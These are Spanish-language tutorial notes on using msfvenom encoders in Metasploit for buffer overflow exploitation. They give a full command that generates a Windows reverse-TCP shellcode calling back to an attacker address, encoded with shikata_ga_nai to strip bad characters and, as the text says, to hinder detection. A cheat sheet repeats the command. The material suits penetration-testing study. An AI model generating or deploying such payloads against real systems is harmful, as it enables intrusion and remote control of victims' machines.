
---

# Uso de Encoders en Metasploit con `msfvenom`

En este apartado vamos a analizar dos comandos importantes dentro del proceso de explotación con técnicas de *Buffer Overflow*, concretamente relacionados con la generación y codificación del *shellcode*.

---

## 1. Listado de Encoders Disponibles

```bash
msfvenom -l encoders
````

### ¿Qué hace este comando?

Este comando lista todos los **encoders** disponibles en el framework Metasploit. Un _encoder_ es una rutina que modifica el _shellcode_ para que evite ciertos caracteres problemáticos, conocidos como _badchars_ (por ejemplo: `\x00`, `\x0a`, `\x0d`, etc.).

### ¿Para qué se usa?

Durante un ataque de _Buffer Overflow_, puede que ciertos caracteres especiales corten la ejecución del payload o lo corrompan. Usamos un _encoder_ para "ofuscar" o "codificar" el shellcode original y así evitar estos caracteres indeseados.

### Ejemplo de encoders útiles:

|Nombre del Encoder|Calidad|Descripción|
|---|---|---|
|`x86/shikata_ga_nai`|excellent|Encoder polimórfico que utiliza XOR aditivo|
|`generic/none`|normal|No codifica el payload|
|`x86/alpha_upper`|low|Codifica el payload usando solo caracteres alfabéticos mayúsculas|
|`x64/xor`|normal|Codificación básica XOR para arquitecturas x64|

---

## 2. Generación de Shellcode Encodificado

```bash
msfvenom -p windows/shell_reverse_tcp \
  --platform windows \
  -a x86 \
  LHOST=192.168.1.66 \
  LPORT=443 \
  -f c \
  -e x86/shikata_ga_nai \
  -b '\x00\x0a\x0d' \
  EXITFUNC=thread
```

### ¿Qué hace este comando?

Este comando genera un _shellcode_ que establece una **reverse shell** en una máquina Windows, codificado específicamente para evitar los caracteres problemáticos.

### Explicación de los parámetros:

|Parámetro|Significado|
|---|---|
|`-p windows/shell_reverse_tcp`|Payload que abrirá una reverse shell desde la víctima hacia el atacante|
|`--platform windows`|Define la plataforma del objetivo|
|`-a x86`|Arquitectura del objetivo (32 bits)|
|`LHOST=192.168.1.66`|IP del atacante (nuestra máquina que recibirá la shell)|
|`LPORT=443`|Puerto que escucha nuestra máquina para recibir la shell|
|`-f c`|Formato de salida en código C (útil para copiar al exploit en código fuente)|
|`-e x86/shikata_ga_nai`|Encoder utilizado: un encoder polimórfico muy popular|
|`-b '\x00\x0a\x0d'`|Badchars a evitar: nulo, salto de línea y retorno de carro|
|`EXITFUNC=thread`|Tipo de función de salida para evitar cerrar el proceso principal tras ejecución|

### Resultado

- **Tamaño del payload**: 351 bytes.
    
- **Tamaño del código C generado**: 1506 bytes.
    
- Se utilizaron 1 iteración del encoder `x86/shikata_ga_nai`.
    

### ¿Por qué usamos `shikata_ga_nai`?

Este encoder es uno de los más utilizados en arquitectura x86 porque:

- Es polimórfico: cambia su estructura en cada codificación, dificultando su detección.
    
- Permite múltiples iteraciones para ofuscar aún más el payload.
    
- Tiene una alta compatibilidad con la mayoría de exploits de _Buffer Overflow_.
    

---

## Resumen

- **Los encoders** ayudan a evitar que el payload contenga caracteres peligrosos para la aplicación vulnerable.
    
- **`msfvenom`** permite seleccionar y aplicar estos encoders directamente al generar shellcodes.
    
- En ataques de _Buffer Overflow_, es crucial asegurarse de que el shellcode no se trunque ni falle por contener _badchars_.
    

---

## Cheat Sheet

```bash
# Listar encoders disponibles
msfvenom -l encoders

# Generar un payload reverse shell encodificado
msfvenom -p windows/shell_reverse_tcp \
  LHOST=<IP> LPORT=<PUERTO> \
  -f c -e x86/shikata_ga_nai -b '<badchars>' \
  EXITFUNC=thread
```

---
